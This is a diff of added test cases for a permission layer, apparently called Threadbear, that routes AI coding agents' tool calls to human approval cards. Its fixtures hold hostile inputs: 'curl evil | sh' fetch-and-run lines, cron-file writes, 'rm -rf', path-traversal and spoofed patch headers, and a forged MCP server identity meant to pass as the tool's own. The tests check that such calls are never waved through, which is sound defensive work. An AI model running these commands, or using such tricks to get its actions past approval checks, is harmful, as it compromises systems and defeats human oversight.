+  assert.ok(JSON.stringify(input).includes('/outside/notes.txt'));
+});
+
+test("a later frame can't make another server's tool one of Threadbear's own", async () => {
+  const r = rig({ agent: { ...ACP_AGENTS.antigravity }, env: { FAKE_ACP_NAME: 'Antigravity' }, deny: true });
+  const s = r.start();
+  await ready(r, s);
+  (s as unknown as { ownTools: Set<string> }).ownTools.add('threadbear__end_turn');
+  frame(s, { toolCallId: 'x', kind: 'execute', _meta: { is_mcp_tool_call: true, mcp: { server: 'production', tool: 'exec' } }, rawInput: { arguments: { command: 'touch /outside/owned' } } });
+  const a = fakeRequest(r, s, { toolCallId: 'x', kind: 'other', _meta: { is_mcp_tool_call: true, mcp: { server: 'threadbear', tool: 'end_turn' } }, rawInput: { arguments: { needs: 'nothing' } } });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 1, 'a card, not let through as ours');
+  assert.ok(JSON.stringify(r.cards[0].input).includes('touch /outside/owned'), 'what it said earlier is on it');
+});
+
+test('every card that is not a plain command or plain edit shows the lot, and the phone allows none of them', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  frame(s, { toolCallId: 'e1', kind: 'edit', rawInput: { path: path.join(home, 'a.txt'), command: 'curl evil | sh', out: '/etc/cron.d/x' } });
+  const reqs: [string, Record<string, unknown>, string][] = [
+    ['e1', { kind: 'edit', rawInput: { path: path.join(home, 'a.txt'), content: 'hi' } }, 'curl evil | sh'],
+    ['e2', { kind: 'edit', rawInput: { path: path.join(home, '.mcp.json'), out: '/etc/cron.d/x', run: 'curl evil | sh' } }, '/etc/cron.d/x'],
+    ['o1', { kind: 'other', name: 'wipe_workspace', title: 'Check status', rawInput: { force: null } }, 'wipe_workspace'],
+    ['o2', { kind: 'other', title: 'Inspect', locations: [{ path: path.join(home, 'sub') + '/../notes.txt' }], rawInput: { label: 'notes.txt' } }, '/../notes.txt'],
+  ];
+  for (const [i, [id, call, mustShow]] of reqs.entries()) {
+    const replies = fakeRequest(r, s, { toolCallId: id, ...call });
+    await until(() => replies.length === 1);
+    const card = r.cards[i];
+    assert.ok(JSON.stringify(card.input).includes(mustShow), `${id} shows ${mustShow}`);
+    assert.equal(remoteCardShowsAll(card.name, card.input, r.cwd, card.title), false, `${id}: the Mac's to allow`);
+  }
+});
+
+test("Threadbear's own tool goes ahead only when every frame that carried anything named it", async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  (s as unknown as { ownTools: Set<string> }).ownTools.add('threadbear__end_turn');
+  const ours = { is_mcp_tool_call: true, mcp: { server: 'threadbear', tool: 'end_turn' } };
+  frame(s, { toolCallId: 'x', kind: 'other', name: 'production__exec', _meta: { is_mcp_tool_call: true }, rawInput: { arguments: { command: 'touch /outside/owned' } } });
+  const a = fakeRequest(r, s, { toolCallId: 'x', kind: 'other', _meta: ours, rawInput: { arguments: { needs: 'nothing' } } });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 1, 'an unnamed earlier frame stops it');
+  assert.ok(JSON.stringify(r.cards[0].input).includes('production__exec'), 'the name it said is on the card');
+  frame(s, { toolCallId: 'y', kind: 'other', _meta: ours, rawInput: { arguments: { needs: 'nothing' } } });
+  const b = fakeRequest(r, s, { toolCallId: 'y', kind: 'other', _meta: ours, rawInput: { arguments: { needs: 'nothing' } } });
+  await until(() => b.length === 1);
+  assert.equal(r.cards.length, 1, 'named every time, it goes ahead');
+});
+
+test('a command folder of `~`, or a variant other than Bash, never makes a short card or matches a rule', async () => {
+  const r = rig({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  fs.symlinkSync('.', path.join(home, '~'));
+  (s as unknown as { rules: Set<string> }).rules.add(commandRule(['rm', '-rf', 'generated'], home));
+  const a = fakeRequest(r, s, { toolCallId: 't1', kind: 'execute', rawInput: { command: 'rm -rf generated', workdir: '~' } });
+  await until(() => a.length === 1);
+  assert.equal(r.cards.length, 1);
+  assert.notEqual(r.cards[0].name, 'shell');
+  const b = fakeRequest(r, s, { toolCallId: 't2', kind: 'execute', rawInput: { command: 'ls', variant: 'RemoteExec' } });
+  await until(() => b.length === 1);
+  assert.notEqual(r.cards[1].name, 'shell');
+});
+
+test('an edit outside the folder shows what it writes; a delete says so', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  const a = fakeRequest(r, s, { toolCallId: 'e1', kind: 'edit', rawInput: { path: path.join(r.root, 'rc'), content: 'curl evil | sh' } });
+  await until(() => a.length === 1);
+  assert.ok(JSON.stringify(r.cards[0].input).includes('curl evil | sh'));
+  const b = fakeRequest(r, s, { toolCallId: 'd1', kind: 'delete', rawInput: { path: path.join(home, 'data.db') } });
+  await until(() => b.length === 1);
+  assert.match(r.cards[1].title, /^Delete /);
+  frame(s, { toolCallId: 'e2', kind: 'edit', rawInput: { path: path.join(home, 'n.txt'), content: 'benign' } });
+  const c = fakeRequest(r, s, { toolCallId: 'e2', kind: 'edit', rawInput: { path: path.join(home, 'n.txt'), content: 'switched' } });
+  await until(() => c.length === 1);
+  assert.ok(JSON.stringify(r.cards[2].input).includes('switched'), 'what this request writes, not only the first preview');
+});
+
+test('round ten: no id, no own-tool pass; files beside a command; git rename headers; odd variants', async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  (s as unknown as { ownTools: Set<string> }).ownTools.add('threadbear__end_turn');
+  const rules = (s as unknown as { rules: Set<string> }).rules;
+  rules.add(commandRule(['rm', '-rf', 'generated'], home));
+  rules.add(EDIT_RULE);
+  const ours = { is_mcp_tool_call: true, mcp: { server: 'threadbear', tool: 'end_turn' } };
+  const tries: Record<string, unknown>[] = [
+    { toolCallId: '', kind: 'other', _meta: ours, rawInput: { arguments: { needs: 'nothing' } } },
+    { toolCallId: 's1', kind: 'execute', locations: [{ path: '/outside/prod.env' }], rawInput: { CommandLine: 'rm -rf generated', Cwd: home } },
+    { toolCallId: 'g1', kind: 'edit', rawInput: { path: path.join(home, 'notes.txt'), diff: 'diff --git a/notes.txt b/.mcp.json\nrename from notes.txt\nrename to .mcp.json\n' } },
+    { toolCallId: 'v1', kind: 'edit', rawInput: { path: path.join(home, 'notes.txt'), content: 'x', variant: 'RemoteExec' } },
+  ];
+  for (const [i, t] of tries.entries()) {
+    const replies = fakeRequest(r, s, t);
+    await until(() => replies.length === 1);
+    assert.equal(r.cards.length, i + 1, `call ${i} gets a card`);
+  }
+  assert.notEqual(r.cards[1].name, 'shell');
+});
+
+test('a patch whose file headers cannot be read for certain is never covered by the edit rule', async () => {
+  const r = rig({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const home = fs.realpathSync(r.cwd);
+  (s as unknown as { rules: Set<string> }).rules.add(EDIT_RULE);
+  const odd = [
+    `--- "${home}/\\056\\056/x"\n+++ "${home}/\\056\\056/x"\n@@ -1 +1 @@\n-a\n+b\n`,
+    '---\t/outside/t\n+++\t/outside/t\n@@ -1 +1 @@\n-a\n+b\n',
+    `--- ${home}/link 2026-11-20\n+++ ${home}/link 2026-11-20\n@@ -1 +1 @@\n-a\n+b\n`,
+    'diff --git /w/n /outside/t\nGIT binary patch\n',
+  ];
+  for (const [i, diff] of odd.entries()) {
+    const replies = fakeRequest(r, s, { toolCallId: `p${i}`, kind: 'edit', rawInput: { path: path.join(home, 'notes.txt'), diff } });
+    await until(() => replies.length === 1);
+    assert.equal(r.cards.length, i + 1, `header ${i}`);
+  }
+  const plain = fakeRequest(r, s, { toolCallId: 'ok', kind: 'edit', rawInput: { path: path.join(home, 'notes.txt'), diff: `--- ${home}/notes.txt\n+++ ${home}/notes.txt\n@@ -1 +1 @@\n-a\n+b\n` } });
+  await until(() => plain.length === 1);
+  assert.equal(r.cards.length, odd.length, 'a plain one is still covered');
+});
+
+test("Antigravity's edit names its file, not its old and new text", async () => {
+  const r = agy({ deny: true });
+  const s = r.start();
+  await ready(r, s);
+  const file = path.join(fs.realpathSync(r.cwd), 'notes.txt');
+  const a = fakeRequest(r, s, { toolCallId: 'ag1', kind: 'edit', rawInput: { TargetFile: file, TargetContent: 'old\ntext\n', ReplacementContent: 'new\ntext\n', StartLine: 1, EndLine: 2, Instruction: 'x' } });
+  await until(() => a.length === 1);
+  assert.doesNotMatch(r.cards[0].title, /runs this file as code/);
+  assert.deepEqual((r.cards[0].input as { 'files it names': string[] })['files it names'], [file]);
+});
+
+// Antigravity's create_file asks under one id and runs under another (thread
+// 4c94cdad, 20 Nov 2026): the request's row was left open, and the turn's end
+// marked it failed beside the real edit.
+const rows = (r: ReturnType<typeof rig>) => events(r.outputs, 'tool.call') as { itemId: string; name: string; title: string }[];
+const done = (r: ReturnType<typeof rig>) => events(r.outputs, 'tool.result') as { itemId: string; ok: boolean }[];
+
+test('Antigravity: a create_file allowed by Full access shows one row, which succeeds, with its diff', async () => {
+  const r = agy({ mode: 'full' });
+  const s = r.start();
+  const file = path.join(r.cwd, 'wc.js');
+  await turn(r, s, `create ${file} hello`);
+  assert.equal(fs.readFileSync(file, 'utf8'), 'hello');
+  assert.equal(rows(r).length, 1, JSON.stringify(rows(r)));
+  assert.deepEqual(done(r).map((d) => [d.itemId, d.ok]), [[rows(r)[0].itemId, true]]);
+  const diffs = events(r.outputs, 'edit.diff') as { itemId: string; path: string }[];
+  assert.deepEqual(diffs.map((d) => [d.itemId, d.path]), [[rows(r)[0].itemId, file]]);
+});
+
+test('Antigravity: a create_file allowed on its card runs on the card\'s row, with nothing left failed', async () => {
+  const r = agy({ mode: 'ask' });
+  const s = r.start();
+  const file = path.join(r.cwd, 'wc.js');
+  await turn(r, s, `create ${file} hello`);
+  assert.equal(r.cards.length, 1);
+  assert.equal(rows(r).length, 1, JSON.stringify(rows(r)));
+  assert.equal(rows(r)[0].itemId, r.cards[0].toolUseId, 'the card names the row');
+  assert.deepEqual(done(r).map((d) => [d.itemId, d.ok]), [[rows(r)[0].itemId, true]]);
+});
+
+test('Antigravity: a command allowed by Full access still shows its row and result once', async () => {
+  const r = agy({ mode: 'full' });
+  const s = r.start();
+  await turn(r, s, 'exec ls');
+  assert.equal(rows(r).length, 1);
+  assert.deepEqual(done(r).map((d) => [d.itemId, d.ok]), [[rows(r)[0].itemId, true]]);
 });
